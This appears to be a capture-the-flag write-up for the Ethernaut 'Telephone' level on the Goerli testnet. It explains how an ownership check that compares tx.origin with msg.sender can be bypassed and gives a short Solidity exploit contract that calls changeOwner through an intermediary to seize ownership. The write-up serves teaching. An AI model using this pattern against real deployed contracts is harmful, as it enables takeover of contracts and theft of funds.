Level 4
==========================================================================================================================================

Deployment transaction: https://goerli.etherscan.io/tx/0xcac0947ce370fbb8ae3f63af306ebb76e91cf8053bca6fe4bcf09d566e7e3b90
Submission transaction: https://goerli.etherscan.io/tx/0x5eca05378594df594c8b8ec2c51763ec06a0eda5bb18574b537b5838c3096a16

-------
This challenge's task is to claim ownership of the Telephone contract. 
The solution to it is in the changeOwner function. 
The condition to change the owner is that tx.origin is different than the msg.sender.
Smart contracts cannot initiate function calls, as they don't have the capability of sending signed transactions. The trigger must be done by Externally Owned Accounts(EOA).
tx.origin corresponds to the externally owned account that has started the all function calls inside a transaction. Msg.sender is the address who is doing a specific call. It can be
a Contract Account or an EOA.

#### Exploit contract:

The interface refers to Telephone 's changeOwner function. 
To solve the challenge, we deploy a script that will deploy this exploit then make a _changeOwner function call. The contract itself will call the changeOwner function at the Telephone's
contract, meaning it is the msg.sender. My account is the tx.origin.

```
    interface Telephone{
        function changeOwner(address _owner);
    }

    contract TelephoneExploit {
        address private target;

    constructor (address _target)  {
        target = _target;
    }
    function _changeOwner() external{
        // this msg.sender value is the caller's address.
        Telephone(target).changeOwner(msg.sender);
        
    }



}

```

[Ownership claim tx]('https://goerli.etherscan.io/tx/0x95c0e445d6b3929c4c98c5767024ed6ab697514877107f6e86fff22d20299cbb');







